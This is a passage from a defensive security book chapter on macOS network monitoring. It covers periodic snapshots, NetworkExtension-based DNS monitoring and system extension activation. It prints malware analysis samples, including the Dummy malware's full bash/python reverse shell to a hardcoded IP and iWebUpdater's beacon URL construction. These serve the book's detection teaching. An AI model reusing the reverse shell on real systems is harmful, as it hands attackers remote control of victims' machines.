<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><section epub:type="chapter" role="doc-chapter" aria-labelledby="ch7">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_155" aria-label="155"/>&#13;
<hgroup>&#13;
&#13;
<h2 class="CHAPTER" id="ch7">&#13;
<span class="CN"><span class="SANS_Futura_Std_Bold_Condensed_B_11">7</span></span>&#13;
<span class="CT"><span class="Sans_Dogma_B">NETWORK MONITORING</span></span>&#13;
</h2>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt="" width="377" height="376"/></figure>&#13;
<p class="CO">In this chapter, I’ll describe various approaches for monitoring network activity on macOS systems. I’ll start simple, by showing you how to regularly schedule network snapshots to obtain a near-continuous view of a host’s network activity. Next, you’ll dive deep into Apple’s <i>NetworkExtension</i> framework and APIs, which provide a means of customizing the operating system’s core networking features and building comprehensive network monitoring tools. As an example, I’ll discuss leveraging this powerful framework to build host-based DNS monitors and firewalls capable of filtering and blocking selected activity.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_156" aria-label="156"/>In <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span>, we generated a snapshot of a device’s network state at given moments. While this simple approach can efficiently detect a variety of malicious behaviors, it has several limitations. Most notably, if malware isn’t accessing the network at the exact time at which the snapshot is taken, it will remain undetected. For example, the malware leveraged in the 3CX supply chain attack beaconed only every hour or two.<sup><a role="doc-noteref" id="chapter7_1" href="#chapter7-1">1</a></sup> Unless the network snapshot was serendipitously scheduled, it would miss the malware’s network activity.</p>&#13;
<p class="TX">To overcome this shortcoming, we can continuously monitor the network for signs of infections. The collected network data could help us build baselines of normal traffic over time and provide a corpus for input to a larger distributed threat hunting system. While these approaches can be more complex to implement than simple snapshot tools, the insight they provide into the network activity on a host makes them an invaluable component of any comprehensive malware detection tool.</p>&#13;
<p class="TX">This book won’t cover using the framework for full packet captures, as capturing and processing this data would require significant resources, so it’s almost always best to perform these captures directly on the network, rather than on the host. Moreover, full packet captures are generally overkill for detecting malware. Often, simply identifying some unauthorized network activity, such as a listening socket or a connection to an unrecognized API endpoint, is sufficient to cast suspicion on a process (especially those that are unrecognized) and reveal an infection.</p>&#13;
<blockquote>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>To use the</i> <span class="note_Italic">NetworkExtension</span> <i>framework tools, we must add the proper entitlements, and we must build the code with provisioning profiles that authorize these entitlements at runtime. I won’t cover this process here, as the focus is on core concepts of working with the framework. Turn to <a href="part3.xhtml">Part III</a> to learn how to obtain the necessary entitlements and create provisioning profiles.</i></p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
&#13;
<h3 class="H1"><span id="sec1"/><span id="h1-48"/><span class="SANS_Futura_Std_Bold_B_11">Obtaining Regular Snapshots</span></h3>&#13;
<p class="TNI">One simple way to continuously monitor network activity is to repeatedly take snapshots of the current network state. For example, in <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span>, we used Apple’s <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span> utility to display network information. When you run this tool, it appears to update the information whenever new connections appear. However, consulting the utility’s man page reveals that, behind the scenes, <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span> does nothing more than obtain network snapshots at regular intervals. By default, it takes a snapshot every second, though you can change this interval with the <span class="SANS_TheSansMonoCd_W5Regular_11">-s</span> command line option. Is this a true network monitor? No, but its approach is straightforward and, assuming the snapshots happen often, likely comprehensive enough to detect suspicious network activity.</p>&#13;
<p class="TX">To mimic <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span>, we can capture a snapshot of the network activity using the <i>NetworkStatistics</i> framework, invoking its <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerQueryAllSourcesDescriptions</span> API, as discussed in <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span>. Then we can simply reinvoke the API at regular intervals. The code in <a href="chapter7.xhtml#Lis7-1">Listing 7-1</a> does exactly this.</p>&#13;
<span id="Lis7-1"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_157" aria-label="157"/>dispatch_queue_t queue = dispatch_queue_create(NULL, NULL); <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
dispatch_source_t source = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, queue); <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
NSUInteger refreshRate = 10;&#13;
&#13;
dispatch_source_set_timer(source, DISPATCH_TIME_NOW, refreshRate * NSEC_PER_SEC, 0); <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
&#13;
dispatch_source_set_event_handler(source, ^{ <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
    NStatManagerQueryAllSourcesDescriptions(manager, ^{&#13;
        // Code here will execute when the query is complete.&#13;
    });&#13;
});&#13;
&#13;
dispatch_resume(source); <span class="codewide_CodeAnnotation" aria-label="annotation5">❺</span>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-1: Regularly capturing the network state</span></p>&#13;
<p class="TX">The code first creates a dispatch queue <span class="CodeAnnotation" aria-label="annotation1">❶</span> and a dispatch source <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Then it sets the start time and refresh rate for the dispatch source via the <span class="SANS_TheSansMonoCd_W5Regular_11">dispatch_source_set_timer</span> API <span class="CodeAnnotation" aria-label="annotation3">❸</span>. For illustrative purposes, we specify a refresh rate of 10 seconds. The API call requires this rate in nanoseconds, so we multiply it by <span class="SANS_TheSansMonoCd_W5Regular_11">NSEC_PER_SEC</span>, a system constant representing the number of nanoseconds in one second. Next, we create an event handler <span class="CodeAnnotation" aria-label="annotation4">❹</span> that will reinvoke the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerQueryAllSourcesDescriptions</span> API each time the dispatch source is refreshed. Finally, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">dispatch_resume</span> function <span class="CodeAnnotation" aria-label="annotation5">❺</span> to set the snapshot-based monitor in motion. Now, onto a continual monitor.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
&#13;
<h3 class="H1"><span id="sec2"/><span id="h1-49"/><span class="SANS_Futura_Std_Bold_B_11">DNS Monitoring</span></h3>&#13;
<p class="TNI">Monitoring DNS traffic is an effective way to detect many types of malware. The idea is simple: regardless of how malware infects a victim’s machine, any connection it makes to a domain, such as its command-and-control server, will generate a DNS request and response. If we monitor DNS traffic directly on the host, we can do the following:</p>&#13;
<blockquote>&#13;
<p class="EX1"><b>Identify new processes using the network</b> Anytime this activity occurs, you should closely examine the new process. Users frequently install new software that accesses the network for legitimate reasons, but if the item isn’t notarized or persists, for example, it could be malicious.</p>&#13;
<p class="EX"><b>Extract the domain that the process is attempting to resolve</b> If the domain looks suspicious (perhaps because it’s hosted by an internet service provider commonly leveraged by malicious actors), it could reveal the presence of malware. Also, saving these DNS requests provides a historical record of system activity that you can query whenever the security community discovers new malware to see, albeit retroactively, whether you’ve been infected.</p>&#13;
<p class="EX2"><b>Detect malware abusing DNS as an exfiltration channel</b> As firewalls typically allow DNS traffic, malware can exfiltrate data through valid DNS requests.</p>&#13;
</blockquote>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_158" aria-label="158"/>Monitoring just DNS traffic is a more efficient approach than monitoring all network activity, yet it still provides a way to uncover most malware. For example, take a look at a malicious updater component I discovered in early 2023.<sup><a role="doc-noteref" id="chapter7_2" href="#chapter7-2">2</a></sup> Dubbed iWebUpdater, this binary persistently installs itself to <i>~/Library/Services/iWebUpdate</i>. It then beacons to the domain <i>iwebservicescloud.com</i> to send information about the infected host and to download and install additional binaries. Within the malicious <i>iWebUpdate</i> binary, you can find this hardcoded domain at the address <span class="SANS_TheSansMonoCd_W5Regular_11">0x10000f7c2</span>:</p>&#13;
&#13;
<pre><code>0x000000010000f7c2  db  "https://iwebservicescloud.com/api/v0", 0</code></pre>&#13;
<p class="TX">In its disassembly, you can see the malware references this address when it builds a URL whose parameters contain information about the infected host:</p>&#13;
&#13;
<pre><code>__snprintf_chk(var_38, var_30, 0x0, 0xffffffffffffffff, "%s%s?v=%d&amp;c=%s&amp;u=&#13;
%s&amp;os=%s&amp;hw=%s", "https://iwebservicescloud.com/api/v0", r13, 0x2, r12,&#13;
byte_100023f50, rcx, rax);&#13;
</code></pre>&#13;
<p class="TX">Then the malicious updater attempts to connect to the URL by leveraging the <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> API. Using the popular network monitoring tool Wireshark, we can observe the DNS request and resulting response (<a href="chapter7.xhtml#fig7-1">Figure 7-1</a>).</p>&#13;
<figure class="IMG"><img class="img1" id="fig7-1" src="../images/Figure7-1.jpg" alt="" width="1390" height="607"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 7-1: A network capture of iWebUpdater resolving the IP address of its update server</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Even though antivirus engines initially didn’t flag the binary as malicious, the <i>iwebservicescloud.com</i> domain has a long history of resolving to IP addresses associated with malicious actors. If we could tie the DNS data back to the iWebUpdate binary (which I’ll show how to do shortly), we could see that it originates from a persistently installed launch agent that isn’t signed. Shady!</p>&#13;
<p class="TX">For another example of the power of DNS monitoring, let’s consider the 3CX supply chain attack more closely. Supply chain attacks are notoriously difficult to detect, and in this case, Apple inadvertently notarized the subverted 3CX installer. Although traditional antivirus software didn’t <span role="doc-pagebreak" epub:type="pagebreak" id="pg_159" aria-label="159"/>initially flag the application as malicious, security tools leveraging DNS monitoring capabilities quickly noticed that something was amiss and began alerting users, who flocked to the 3CX forums, posting messages such as “I had an alert come through . . . telling me that the 3CX Desktop App has been attempting to communicate with a ‘highly suspicious’ domain, likely to be actor controlled.”<sup><a role="doc-noteref" id="chapter7_3" href="#chapter7-3">3</a></sup></p>&#13;
<p class="TX">Could other heuristics have detected the attack? Possibly, but even Apple’s notarization system failed to notice it. Luckily, a DNS monitor provided a way to detect that the subverted application was communicating with a new and unusual domain, and mitigations soon limited what could have been a massively impactful and widespread cybersecurity event.</p>&#13;
<p class="TX">Of course, there are downsides to DNS monitoring. Most notably, it won’t help you detect malware that doesn’t resolve domains, such as simple backdoors that merely open listening sockets for remote connections, or those that directly connect to an IP address. Though such malware is rare, you’ll encounter it occasionally. For example, Dummy, the simple Mac malware mentioned previously, creates a reverse shell to a hardcoded IP address:</p>&#13;
&#13;
<pre><code>#!/bin/bash&#13;
while :&#13;
do&#13;
    python -c&#13;
        'import socket,subprocess,os;&#13;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&#13;
        s.connect(("185.243.115.230",1337));&#13;
        os.dup2(s.fileno(),0);&#13;
        os.dup2(s.fileno(),1);&#13;
        os.dup2(s.fileno(),2);&#13;
        p=subprocess.call(["/bin/sh","-i"]);'&#13;
    sleep 5&#13;
done&#13;
</code></pre>&#13;
<p class="TX">Connecting directly to an IP address doesn’t generate any DNS traffic, so a DNS monitor wouldn’t detect Dummy. In this case, you’d need a more comprehensive <i>filter data provider</i> that is capable of monitoring all traffic. Later in this chapter, I will show you how to build such a tool using the same framework and many of the same APIs used to build a simpler DNS monitor.</p>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
&#13;
<h4 class="H2"><span id="sec3"/><span id="h2-52"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Using the NetworkExtension Framework</span></h4>&#13;
<p class="TNI">Monitoring network traffic on macOS used to require writing a network kernel extension. Apple has since deprecated this approach, along with all third-party kernel extensions, and introduced <i>system extensions</i> to replace it. System extensions run more safely in user mode and provide a modern mechanism to extend or enhance macOS functionality.<sup><a role="doc-noteref" id="chapter7_4" href="#chapter7-4">4</a></sup></p>&#13;
<p class="TX">To extend core networking features, Apple also introduced the user-mode <i>NetworkExtension</i> framework.<sup><a role="doc-noteref" id="chapter7_5" href="#chapter7-5">5</a></sup> By building system extensions that leverage this framework, you can achieve the same capabilities as the now-deprecated network kernel extensions, but from user mode.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_160" aria-label="160"/>System extensions are powerful, so Apple requires that you fulfill several prerequisites before you can deploy your extension:<sup><a role="doc-noteref" id="chapter7_6" href="#chapter7-6">6</a></sup></p>&#13;
<ul class="ul">&#13;
<li class="BL">You must package the extension in an application bundle’s <i>Contents/Library/SystemExtensions/</i> directory.</li>&#13;
<li class="BL">The application containing the extension must be given the <i>com.apple .developer.system-extension.install</i> entitlement, and you must build it with a provisioning profile that provides the means to authorize the entitlement at runtime.</li>&#13;
<li class="BL">The application containing the extension must be signed with an Apple developer ID, as well as notarized.</li>&#13;
<li class="BL">The application containing the extension must be installed in an appropriate <i>Applications</i> directory.</li>&#13;
<li class="BL">In unmanaged environments, macOS requires explicit user approval to load any system extension.</li>&#13;
</ul>&#13;
<p class="TX">I’ll explain how to fulfill these requirements in <span class="Xref"><a href="chapter13.xhtml">Chapter 13</a></span>. As I noted in the book’s introduction, you can turn off System Integrity Protection (SIP) and Apple Mobile File Integrity (AMFI) to sidestep some of them. However, disabling these protections significantly reduces the overall security of the system, so I recommend doing so only within a virtual machine or on a system dedicated to development or testing.</p>&#13;
<p class="TX">Next, I will briefly cover how to programmatically install and load a system extension, then use the <i>NetworkExtension</i> framework to monitor DNS traffic. Here, relevant code snippets are provided, and you can find this code in its entirety in Objective-See’s open source <i>DNSMonitor</i> project, covered in detail in <span class="Xref"><a href="chapter13.xhtml">Chapter 13</a></span>.<sup><a role="doc-noteref" id="chapter7_7" href="#chapter7-7">7</a></sup></p>&#13;
<blockquote>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>Several APIs mentioned in this section have recently been deprecated by Apple, for example, in macOS 15. However, at the time of this publication, they retain their functionality. If you’re developing for older versions of macOS, you’ll still want to use these APIs for compatibility. Additionally, some deprecated functions, such as those from Apple’s</i> <span class="note">libresolv</span> <i>library, lack direct replacements, so it makes sense to continue using them where necessary.</i></p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
&#13;
<h4 class="H2"><span id="sec4"/><span id="h2-53"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Activating a System Extension</span></h4>&#13;
<p class="TNI">Apple requires you to place any system extension in an application bundle, so the code to install, or <i>activate</i>, a system extension must also live in the application. <a href="chapter7.xhtml#Lis7-2">Listing 7-2</a> shows how to programmatically activate such an extension.</p>&#13;
<span id="Lis7-2"/>&#13;
<pre><code>#define EXT_BUNDLE_ID @"com.example.dnsmonitor.extension"&#13;
&#13;
OSSystemExtensionRequest* request = [OSSystemExtensionRequest&#13;
activationRequestForExtension:EXT_BUNDLE_ID&#13;
queue:dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0)]; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_161" aria-label="161"/>request.delegate = <var>&lt;object that conforms to the OSSystemExtensionRequestDelegate protocol&gt;</var>; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
[OSSystemExtensionManager.sharedManager submitRequest:request]; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-2: Installing a system extension</span></p>&#13;
<p class="TX">The application that contains an extension should first invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">OSSystemExtensionRequest</span> class’s <span class="SANS_TheSansMonoCd_W5Regular_11">activationRequestForExtension:queue:</span> method <span class="CodeAnnotation" aria-label="annotation1">❶</span>, which creates a request to activate a system extension.<sup><a role="doc-noteref" id="chapter7_8" href="#chapter7-8">8</a></sup> The method takes the extension’s bundle ID and a dispatch queue, which it will use to call delegate methods. We must set a delegate <span class="CodeAnnotation" aria-label="annotation2">❷</span> before we can submit the request to the system extension manager to trigger the activation <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">Let’s talk about the delegate in a bit more detail. The <span class="SANS_TheSansMonoCd_W5Regular_11">OSSystemExtensionRequest</span> object requires a <i>delegate object</i>, which should conform to the <span class="SANS_TheSansMonoCd_W5Regular_11">OSSystemExtensionRequestDelegate</span> protocol and implement various delegate methods to handle callbacks that occur during the activation process, as well as success and failure cases. The operating system will automatically invoke these delegate methods during the process of activating the extension. Here is a brief overview of these required delegate methods, based on Apple’s documentation:<sup><a role="doc-noteref" id="chapter7_9" href="#chapter7-9">9</a></sup></p>&#13;
<blockquote>&#13;
<p class="EX1"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>requestNeedsUserApproval</b>:</span> Invoked when the system has determined that it needs user approval before activating the extension</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>request:actionForReplacingExtension:withExtension:</b></span> Invoked when another version of the extension is already installed on the system</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>request:didFailWithError:</b></span> Invoked when the activation request has failed</p>&#13;
<p class="EX2"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>request:didFinishWithResult:</b></span> Invoked when the activation request has completed</p>&#13;
</blockquote>&#13;
<p class="TNI1">It’s important that your application implement these required delegate methods. Otherwise, it will crash when the system attempts to invoke them during the activation of your extension.</p>&#13;
<p class="TX">The good news is that implementing the methods doesn’t involve much. For example, the <span class="SANS_TheSansMonoCd_W5Regular_11">requestNeedsUserApproval:</span> method can simply return, as can the <span class="SANS_TheSansMonoCd_W5Regular_11">request:didFailWithError:</span> method (although you’ll likely want to use it to log error messages). The <span class="SANS_TheSansMonoCd_W5Regular_11">request:actionForReplacingExtension:withExtension:</span> method can return a value of <span class="SANS_TheSansMonoCd_W5Regular_11">OSSystemExtensionReplacementActionReplace</span> to tell the operating system to replace any old instances of the extension.</p>&#13;
<p class="TX">Once the user has approved the extension, the system will invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">request:didFinishWithResult:</span> delegate method. If the result passed into this method is <span class="SANS_TheSansMonoCd_W5Regular_11">OSSystemExtensionRequestCompleted</span>, the extension has successfully activated. At this point, you can proceed to enable network monitoring.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
&#13;
<h4 class="H2"><span id="sec5"/><span id="h2-54"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Enabling the Monitoring</span></h4>&#13;
<p class="TNI">Assuming the system extension activated successfully, you can now instruct the system to begin routing all DNS traffic through the extension. A singleton <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyManager</span> object can enable this monitoring, as shown in <a href="chapter7.xhtml#Lis7-3">Listing 7-3</a>.</p>&#13;
<span id="Lis7-3"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_162" aria-label="162"/>#define EXT_BUNDLE_ID @"com.example.dnsmonitor.extension"&#13;
&#13;
[NEDNSProxyManager.sharedManager loadFromPreferencesWithCompletionHandler:^(NSError*&#13;
_Nullable error) { <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
    NEDNSProxyManager.sharedManager.localizedDescription = @"DNS Monitor"; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    NEDNSProxyProviderProtocol* protocol = [[NEDNSProxyProviderProtocol alloc] init]; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
    protocol.providerBundleIdentifier = EXT_BUNDLE_ID;&#13;
    NEDNSProxyManager.sharedManager.providerProtocol = protocol;&#13;
&#13;
    NEDNSProxyManager.sharedManager.enabled = YES; <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
&#13;
    [NEDNSProxyManager.sharedManager&#13;
    saveToPreferencesWithCompletionHandler:^(NSError* _Nullable error) { <span class="codewide_CodeAnnotation" aria-label="annotation5">❺</span>&#13;
        // If there is no error, the DNS proxy provider is running.&#13;
    }];&#13;
}];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-3: Enabling DNS monitoring via an <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NEDNSProxyManager</span> object</span></p>&#13;
<p class="TX">First, we must load the current DNS proxy configuration by calling the <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyManager</span> class’s shared manager <span class="SANS_TheSansMonoCd_W5Regular_11">loadFromPreferencesWithCompletionHandler:</span> method <span class="CodeAnnotation" aria-label="annotation1">❶</span>. As its only argument, this method takes a block to invoke once the preferences have been loaded.</p>&#13;
<p class="TX">After invoking the callback, we can configure the preferences to enable the DNS monitor. First, we set a description <span class="CodeAnnotation" aria-label="annotation2">❷</span> that will appear in the operating system’s System Settings application, which can display all active extensions. Then we allocate and initialize an <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyProviderProtocol</span> object with the bundle ID of our extension <span class="CodeAnnotation" aria-label="annotation3">❸</span>. Following this, we specify that we’re toggling the DNS monitor on by setting the <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyManager</span> object’s shared manager <span class="SANS_TheSansMonoCd_W5Regular_11">enabled</span> instance variable to <span class="SANS_TheSansMonoCd_W5Regular_11">YES</span> <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">Finally, we invoke the shared manager’s <span class="SANS_TheSansMonoCd_W5Regular_11">saveToPreferencesWithCompletionHandler</span> method to save the updated configuration information <span class="CodeAnnotation" aria-label="annotation5">❺</span>. Once we make this call, the system extension should be fully activated, and the operating system will begin proxying DNS traffic through it.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
&#13;
<h4 class="H2"><span id="sec6"/><span id="h2-55"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Writing the Extension</span></h4>&#13;
<p class="TNI">When we make a request to activate a system extension and toggle on a network extension, the system will copy the extension from the application’s bundle into a secure, root-owned directory, <i>/Library/SystemExtension</i>. After verifying the extension, the system will load and execute it as a stand-alone process running with root privileges.</p>&#13;
<p class="TX">Now that we’ve activated the extension from within the application, let’s explore the code found in the extension itself. <a href="chapter7.xhtml#Lis7-4">Listing 7-4</a> begins the extension.</p>&#13;
<span id="Lis7-4"/>&#13;
<pre><code>int main(int argc, const char* argv[]) {&#13;
    [NEProvider startSystemExtensionMode];&#13;
    ...&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_163" aria-label="163"/>    dispatch_main();&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-4: The network extension’s initialization logic</span></p>&#13;
<p class="TX">In the extension’s <span class="SANS_TheSansMonoCd_W5Regular_11">main</span> function, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">NEProvider startSystemExtensionMode</span> method to “start the Network Extension machinery.”<sup><a role="doc-noteref" id="chapter7_10" href="#chapter7-10">10</a></sup> I also recommend making a call to <span class="SANS_TheSansMonoCd_W5Regular_11">dispatch_main</span>; otherwise, the <span class="SANS_TheSansMonoCd_W5Regular_11">main</span> function will return, and your extension will exit.</p>&#13;
<p class="TX">Behind the scenes, the <span class="SANS_TheSansMonoCd_W5Regular_11">startSystemExtensionMode</span> method will cause the <i>NetworkExtension</i> framework to instantiate the class specified under the <span class="SANS_TheSansMonoCd_W5Regular_11">NEProviderClasses</span> key of the <span class="SANS_TheSansMonoCd_W5Regular_11">NetworkExtension</span> dictionary in the extension’s <i>Info.plist</i> file:</p>&#13;
&#13;
<pre><code>&lt;key&gt;NetworkExtension&lt;/key&gt;&#13;
&lt;dict&gt;&#13;
    ...&#13;
    &lt;key&gt;NEProviderClasses&lt;/key&gt;&#13;
    &lt;dict&gt;&#13;
        &lt;key&gt;com.apple.networkextension.dns-proxy&lt;/key&gt;&#13;
        &lt;string&gt;DNSProxyProvider&lt;/string&gt;&#13;
    &lt;/dict&gt;&#13;
&lt;/dict&gt;&#13;
</code></pre>&#13;
<p class="TX">You must create this class, naming it whatever you’d like. Here, we’ve chosen the name <span class="SANS_TheSansMonoCd_W5Regular_11">DNSProxyProvider</span>, and as we’re interested in proxying DNS traffic, we used the key value <span class="SANS_TheSansMonoCd_W5Regular_11">com.apple.networkextension.dns-proxy</span>. This class must inherit from the <span class="SANS_TheSansMonoCd_W5Regular_11">NEProviderClass</span> class or one of its subclasses, such as <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyProvider</span>:</p>&#13;
&#13;
<pre><code>@interface DNSProxyProvider : NEDNSProxyProvider&#13;
    ...&#13;
@end&#13;
</code></pre>&#13;
<p class="TX">Moreover, the class must implement relevant delegate methods that the <i>NetworkExtension</i> framework will call to, for example, handle DNS network events. These delegate methods include the following:</p>&#13;
&#13;
<pre><code>startProxyWithOptions:completionHandler:&#13;
stopProxyWithReason:completionHandler:&#13;
handleNewFlow:&#13;
</code></pre>&#13;
<p class="TX">The start and stop methods provide you with an opportunity to perform any necessary initialization or cleanup. You can learn more about them in the <i>NEDNSProxyProvider.h</i> file or in Apple’s developer documentation for the <span class="SANS_TheSansMonoCd_W5Regular_11">NEDNSProxyProvider</span> class.<sup><a role="doc-noteref" id="chapter7_11" href="#chapter7-11">11</a></sup></p>&#13;
<p class="TX">The <i>NetworkExtension</i> framework will automatically invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">handleNewFlow:</span> delegate method to deliver the network data, so this method should contain the DNS monitor’s core logic. The method gets invoked with a <i>flow</i>, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_164" aria-label="164"/>which represents a unit of network data transferred between a source and destination.</p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">NEAppProxyFlow</span> objects encapsulate flows passed to <span class="SANS_TheSansMonoCd_W5Regular_11">handleNewFlow:</span> to provide an interface for the network data. Because DNS traffic generally travels over UDP, this example focuses solely on UDP flows, whose type is <span class="SANS_TheSansMonoCd_W5Regular_11">NEAppProxyUDPFlow</span>, a subclass of <span class="SANS_TheSansMonoCd_W5Regular_11">NEAppProxyFlow</span>. In <span class="Xref"><a href="chapter13.xhtml">Chapter 13</a></span>, I’ll go through the steps of proxying UDP traffic in detail, but for now, we’ll just consider the process of interacting with DNS packets.</p>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
&#13;
<h5 class="H3"><span id="sec7"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">Parsing DNS Requests</span></h5>&#13;
<p class="TNI">We can read from an <span class="SANS_TheSansMonoCd_W5Regular_11">NEAppProxyUDPFlow</span> flow object to obtain a list of datagrams for a specific DNS request (or <i>question</i>, in DNS parlance). Each datagram is stored in an <span class="SANS_TheSansMonoCd_W5Regular_11">NSData</span> object; <a href="chapter7.xhtml#Lis7-5">Listing 7-5</a> parses and prints these out.</p>&#13;
<span id="Lis7-5"/>&#13;
<pre><code>#import &lt;dns_util.h&gt;&#13;
...&#13;
&#13;
[flow readDatagramsWithCompletionHandler:^(&#13;
NSArray* datagrams, NSArray* endpoints, NSError* error) {&#13;
    for(int i = 0; i &lt; datagrams.count; i++)  {&#13;
        NSData* packet = datagrams[i];&#13;
&#13;
        dns_reply_t* parsedPacket = dns_parse_packet(packet.bytes, (uint32_t)packet.length); <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
        dns_print_reply(parsedPacket, stdout, 0xFFFF); <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
        ...&#13;
        dns_free_reply(parsedPacket); <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
    }&#13;
    ...&#13;
}];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 7-5: Reading and then parsing DNS datagrams</span></p>&#13;
<p class="TX">We parse the packet via the <span class="SANS_TheSansMonoCd_W5Regular_11">dns_parse_packet</span> function <span class="CodeAnnotation" aria-label="annotation1">❶</span>, found in Apple’s <i>libresolv</i> library. We then print out the packet via a call to the <span class="SANS_TheSansMonoCd_W5Regular_11">dns_print_reply</span> function <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Finally, we free it via the <span class="SANS_TheSansMonoCd_W5Regular_11">dns_free_reply</span> function <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">Of course, you’ll likely want your program to examine the DNS request rather than just print it out. You can inspect the parsed DNS record returned by the <span class="SANS_TheSansMonoCd_W5Regular_11">dns_parse_packet</span> function, which has the type <span class="SANS_TheSansMonoCd_W5Regular_11">dns_reply_t</span>. For example, <a href="chapter7.xhtml#Lis7-6">Listing 7-6</a> shows how to access the request’s fully qualified domain name (FQDN).</p>&#13;
<span id="Lis7-6"/>&#13;
<pre><code>NSMutableArray* questions = [NSMutableArray array];&#13;
&#13;
for(uint16_t i = 0; i &lt; parsedPacket-&gt;header-&gt;qdcount; i++) { <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
    NSMutableDictionary* details = [NSMutableDictionary dictionary];&#13;
    dns_question_t* question = parsedPacket-&gt;question[i];&#13;
&#13;
    details[@"Question Name"] =&#13;
    [NSString stringWithUTF8String:question-&gt;name]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
    details[@"Question Class"] =&#13;
